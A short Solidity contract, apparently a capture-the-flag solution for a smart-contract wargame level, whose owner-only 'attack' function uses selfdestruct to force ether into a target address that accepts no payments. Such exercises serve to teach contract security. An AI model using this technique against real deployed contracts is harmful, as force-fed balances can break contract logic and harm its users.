//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Quest07 is Ownable {
    function attack(address forceAddress) public payable onlyOwner {
        require(msg.value > 0, "You must send a positive amount of ether");

        selfdestruct(payable(forceAddress));
    }
}
